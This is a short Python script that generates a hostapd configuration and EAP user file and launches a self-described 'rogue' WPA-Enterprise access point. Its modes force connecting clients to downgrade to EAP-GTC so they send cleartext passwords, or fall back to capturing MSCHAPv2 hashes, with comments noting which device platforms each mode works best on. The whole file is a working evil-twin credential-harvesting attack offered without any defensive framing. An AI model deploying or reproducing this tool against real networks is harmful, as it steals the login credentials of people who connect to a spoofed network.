import subprocess
import os

def generate_hostapd_conf(iface, ssid, channel=6, negotiate="balanced"):

    # Build EAP user file based on negotiation mode
    if negotiate == "gtc-downgrade":
        # Forces cleartext passwords — works best on macOS/iOS
        eap_user_content = """*       PEAP,TTLS,TLS,FAST
"t"*    GTC    [2]
"""
    elif negotiate == "balanced":
        # Tries GTC first (cleartext), falls back to MSCHAPv2 (hash)
        eap_user_content = """*       PEAP,TTLS,TLS,FAST
"t"*    GTC,MSCHAPV2,MD5,TTLS-PAP    [2]
"""
    else:
        # Default — MSCHAPv2 only, works on Windows/Android
        eap_user_content = """*       PEAP,TTLS,TLS,FAST
"t"*    MSCHAPV2,MD5    [2]
"""

    # Write EAP user file
    with open("/tmp/hostapd.eap_user", "w") as f:
        f.write(eap_user_content)

    # Get absolute path for certs
    base_dir = os.path.dirname(os.path.abspath(__file__))
    cert_dir = os.path.join(base_dir, "certs")

    # Write hostapd.conf dynamically
    conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/tmp/hostapd.eap_user
ca_cert={cert_dir}/ca.pem
server_cert={cert_dir}/server.pem
private_key={cert_dir}/server.key
logger_stdout=-1
logger_stdout_level=0
"""
    with open("/tmp/rogue_hostapd.conf", "w") as f:
        f.write(conf)

    print(f"[+] Config generated → SSID: {ssid} | Interface: {iface} | Channel: {channel} | Mode: {negotiate}")


def launch_ap(iface, ssid, channel=6, negotiate="balanced"):
    generate_hostapd_conf(iface, ssid, channel, negotiate)
    print("[*] Launching rogue AP... Press Ctrl+C to stop")
    subprocess.run(["hostapd", "/tmp/rogue_hostapd.conf"])
